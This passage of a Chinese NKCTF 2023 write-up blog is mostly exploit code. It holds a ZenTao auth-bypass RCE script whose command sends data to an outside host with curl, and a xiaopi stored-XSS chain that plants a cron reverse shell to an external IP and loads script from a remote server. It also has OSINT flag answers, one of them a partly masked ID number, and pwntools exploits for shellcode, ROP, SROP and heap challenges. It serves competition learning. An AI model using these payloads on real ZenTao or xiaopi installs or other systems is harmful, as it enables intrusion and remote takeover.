class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">权限绕过+RCE POC 伪静态传参版</span><br><span class="hljs-string">禅道系统 影响版本 安全版本</span><br><span class="hljs-string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_pms-1.png"></p>
+<h2 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h2><p>小皮存储型XSS-&gt;rce</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/128954060">参考文章</a></p>
+<p>请求头加上<code>X-Requested-With: XMLHttpRequest</code>就能访问登录框</p>
+<p>vps上放定时任务，反弹shell</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure>
+
+<p><code>python</code>开启一个<code>http</code>服务</p>
+<p><code>python3 -m http.server 7777</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-2.png"></p>
+<p>在登录处用户名框中插入<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-1.png"></p>
+<p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-3.png"></p>
+<h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Bridge-1.png"></p>
+<p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p>
+<h2 id="两个人的夜晚"><a href="#两个人的夜晚" class="headerlink" title="两个人的夜晚"></a>两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p>
+<p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p>
+<h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E7%8B%82%E9%A3%99-1.png"></p>
+<p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p>
+<h2 id="real-social-engineering"><a href="#real-social-engineering" class="headerlink" title="real-social-engineering"></a>real-social-engineering</h2><p>github搜他id，找到博客地址：<a target="_blank" rel="noopener" href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p>
+<p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p>
+<p><code>NKCTF&#123;6107**********4710&#125;</code></p>
+<h2 id="Ferris-Wheel"><a href="#Ferris-Wheel" class="headerlink" title="Ferris_Wheel"></a>Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Ferris_Wheel-1.png"></p>
+<p>百度地图找到渝西之眼，组合爆破下地名</p>
+<p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p>
+<h2 id="旅程的开始"><a href="#旅程的开始" class="headerlink" title="旅程的开始"></a>旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E6%97%85%E7%A8%8B%E7%9A%84%E5%BC%80%E5%A7%8B-1.png"></p>
+<p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p>
+<h2 id="The-other-Bridge"><a href="#The-other-Bridge" class="headerlink" title="The other Bridge"></a>The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/The%20other%20Bridge-1.png"></p>
+<p>根据提示加个<code>畔</code></p>
+<p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p>
+<h2 id="decompile"><a href="#decompile" class="headerlink" title="decompile"></a>decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p>
+<p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title 